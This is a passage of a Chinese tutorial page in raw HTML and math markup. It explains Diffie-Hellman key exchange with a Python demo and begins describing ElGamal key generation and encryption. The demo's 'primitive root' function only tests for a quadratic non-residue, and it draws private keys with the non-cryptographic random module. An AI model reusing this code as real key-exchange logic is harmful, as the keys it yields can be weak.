mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">A=G^a \mod {p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>类似的，B取一个私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span>发给A计算结果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>=</mo><msup><mi>G</mi><mi>b</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">B=G^b\ mod\ {p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">p</span></span></span></span></span></li><li>A计算出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><msup><mi>B</mi><mi>a</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>b</mi></msup><msup><mo stretchy="false">)</mo><mi>a</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>=</mo><msup><mi>g</mi><mrow><mi>a</mi><mi>b</mi></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">S=B^a\mod{p}=(g^b)^a\mod{p}=g^{ab}\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ab</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>B也能计算出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><msup><mi>A</mi><mi>b</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>a</mi></msup><msup><mo stretchy="false">)</mo><mi>b</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>=</mo><msup><mi>g</mi><mrow><mi>a</mi><mi>b</mi></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">S=A^b\mod{p}=(g^a)^b\mod{p}=g^{ab}\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ab</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>A与B得到共享密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></li></ul><p>python实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br> <br><br><span class="hljs-comment">#求最小原根</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_generator</span>(<span class="hljs-params">n</span>):<br>    k=(n-<span class="hljs-number">1</span>)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,n-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> multimod(i,k,n)!=<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> i<br>        <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">multimod</span>(<span class="hljs-params">a,k,n</span>):    <span class="hljs-comment">#快速幂取模</span><br>    ans=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(k!=<span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">if</span> k&amp;<span class="hljs-number">1</span>:<br>            ans = (ans * a) % n<br>        a=(a*a)%n<br>        k=k&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> ans<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><br><span class="hljs-comment">#得到规定的素数</span><br>    p=getPrime(<span class="hljs-number">512</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;得到生成的随机素数为：&quot;</span>+<span class="hljs-built_in">str</span>(p))<br><span class="hljs-comment">#得到素数的一个原根</span><br>    G = get_generator(p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(p) + <span class="hljs-string">&#x27; 的一个原根为：&#x27;</span>+<span class="hljs-built_in">str</span>(G))<br><br><span class="hljs-comment">#得到A的私钥</span><br>    a = random.randint(<span class="hljs-number">0</span>, p-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;A随机生成的私钥为：&#x27;</span>,a)<br><br><span class="hljs-comment">#得到B的私钥</span><br>    b = random.randint(<span class="hljs-number">0</span>, p-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;B随机生成的私钥为：&#x27;</span>,b)<br><br><span class="hljs-comment">#得到A的公钥</span><br>    A=multimod(G,a,p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;A的公钥为：%d&#x27;</span>%A)<br><br><span class="hljs-comment">#得到B的公钥</span><br>    B=multimod(G,b,p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;B的公钥为：%d&#x27;</span>%B)<br><br>    <span class="hljs-comment">#AB进行公钥交换，攻击者只能获取到两个公钥</span><br>    <span class="hljs-comment">#AB分别用自己的私钥再对对方发来的公钥进行计算</span><br><br>    <span class="hljs-comment">#交换后A的密钥</span><br>    S1 = <span class="hljs-built_in">pow</span>(B,a,p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;A最后得到的密钥：%d&#x27;</span>%S1)<br>    <span class="hljs-comment">#交换后B的密钥</span><br>    S2 = <span class="hljs-built_in">pow</span>(A,b,p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;B最后得到的密钥：%d&#x27;</span>%S2)<br><br>    <span class="hljs-comment">#最后计算的结果都是</span><br>    <span class="hljs-comment">#g^ab % p</span><br>    <span class="hljs-comment">#AB完成密钥交换</span><br></code></pre></td></tr></table></figure><h1 id="ElGamal算法">ElGamal算法</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">该算法与Difffie-Hellman非常类似，ElGamal的系统用户在循环群<span class="hljs-selector-tag">G</span>内选择一个大素数<span class="hljs-selector-tag">p</span>，<span class="hljs-selector-tag">g</span>是<span class="hljs-selector-tag">p</span>的原根，将<span class="hljs-selector-tag">p</span>和<span class="hljs-selector-tag">g</span>公开<br></code></pre></td></tr></table></figure><h2 id="密钥生成">密钥生成</h2><ul><li>A从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>2</mn><mo separator="true">,</mo><mi>p</mi><mo>−</mo><mn>2</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[2,p-2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">]</span></span></span></span>中选取一个整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></li><li>计算A的公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><msup><mi>g</mi><mi>x</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">y=g^x\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8588em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li></ul><p>可以得到私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>，公钥为{<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mtext>，</mtext><mi>p</mi><mtext>，</mtext><mi>g</mi><mtext>，</mtext><mi>y</mi></mrow><annotation encoding="application/x-tex">{G，p，g，y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></span>}，公开公钥。</p><h2 id="加密">加密</h2><p>B使用A公开的{<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mtext>，</mtext><mi>p</mi><mtext>，</mtext><mi>g</mi><mtext>，</mtext><mi>y</mi></mrow><annotation encoding="application/x-tex">{G，p，g，y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></span>}给A发送消息：</p><ul><li>用户B要发送消息<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>给A，先将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>映射到循环群<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span>中得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span></li><li>B从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>2</mn><mo separator="true">,</mo><mi>p</mi><mo>−</mo><mn>2</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[2,p-2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">]</span></span></span></span>中随机选择一个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>g</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">c_1=g^k\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>B计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mo>∗</mo><msup><mi>y</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">c_2=m*y^k\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>发送密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>c</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(c_1,c_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span 